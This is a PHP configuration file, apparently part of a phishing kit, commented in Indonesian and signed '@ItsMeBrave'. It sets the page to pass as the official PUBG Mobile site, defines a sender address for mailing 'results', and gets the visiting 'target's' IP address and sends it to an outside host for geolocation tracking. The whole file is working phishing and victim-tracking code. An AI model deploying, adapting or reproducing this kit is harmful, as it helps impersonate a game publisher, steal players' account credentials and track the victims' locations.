<?php
// SCRIPT EDITED BY @ItsMeBrave

// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

// KONTROL UNTUK MENDAPATKAN INFORMASI TAHUN SAAT INI (UNTUK DITAMPILKAN DIBAGIAN FOOTER HALAMAN)
$yearNow = date('Y');

// KONTROL UNTUK DESKRIPSI HALAMAN
$title = 'PUBG MOBILE | Relive The Rush';
$description = 'PUBG MOBILE | Relive The Rush';
$copyright = 'PUBG MOBILE';
$theme = '#000';
$image = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = '';
$sender = 'From: ItsMeBrave <brave@serverid.com>';

// MENDAPATKAN ALAMAT IP PRIBADI SI TARGET
function getClientIP() {
$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
$ipaddress = getenv('REMOTE_ADDR');
else
$ipaddress = 'UNKNOWN';
return $ipaddress;
}

// MENGIRIM ALAMAT IP PRIBADI SI TARGET KE SERVER UNTUK DILACAK
$url = "https://agungip.com/pro/?ip=".getClientIP();

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$resp = curl_exec($curl);
		curl_close($curl);
$data = json_decode($resp,true);

// HASIL PELACAKAN ALAMAT IP PRIBADI SI TARGET
$braveshere_ip_address = getClientIP();
$braveshere_flag = $data['flag'];
$braveshere_callingcode = $data['callcode'];
$braveshere_continent = $data['benua'];
$braveshere_country = $data['negara'];
$braveshere_region = $data['provinsi'];
$braveshere_city = $data['kota'];
?>